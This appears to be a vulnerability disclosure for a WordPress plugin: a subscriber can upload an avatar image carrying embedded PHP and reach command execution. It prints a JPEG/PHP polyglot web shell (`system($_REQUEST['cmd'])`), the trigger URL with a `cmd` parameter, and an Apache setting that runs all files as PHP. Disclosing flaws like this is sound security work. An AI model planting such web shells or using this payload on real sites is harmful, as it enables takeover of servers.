# Vulnerability Report: Command Execution via Image Upload in WordPress Plugin

## Summary

An authenticated user (Subscriber+) can upload valid images with embedded PHP code because contents of an image are not properly checked.

- **Impact**: Arbitrary command execution
- **Conditions**: Server configuration allowing non-standard file extensions (like `.jpg` or `.png`) to be treated as PHP executable files.

## Steps to Reproduce

1. **Log in as a Subscriber+**
   - Log in with a user account that has at least Subscriber privileges.

2. **Upload a Malicious Image**
   - Change your avatar to a valid image with embedded PHP code. Here is an example of what was used for the PoC:

     ```plaintext
     ÿØÿà JFIF  ` `  ÿáfExif  MM *           ‡i      >ê      2    ê                                                                                                                                                                                                                                                                          ê     P    ê                                                                                                                                                                                                                                                                           ÿáÝhttp://ns.adobe.com/xap/1.0/ <?xpacket begin='ï»¿' id='W5M0MpCehiHzreSzNTczkc9d'?>

     '<?php system($_REQUEST['cmd']); ?>'
     <?php system($_REQUEST['cmd']); ?>                      
     ```

3. **Access the Uploaded Image**
   - Access the image at the URL:
   
     ```
     http://localhost/pentest/wp-content/uploads/2024/11/cont_avatar.jpg
     ```

4. **Execute Commands**
   - Execute commands by adding a `cmd` parameter to the URL, such as:

     ```
     http://localhost/pentest/wp-content/uploads/2024/11/cont_avatar.jpg?cmd=whoami
     ```

## Note

This PoC will work if the server is configured to execute PHP files. Here is the line in `httpd.conf` that allowed the code to be executed:

```apache
<FilesMatch ".*">
    SetHandler application/x-httpd-php
</FilesMatch>
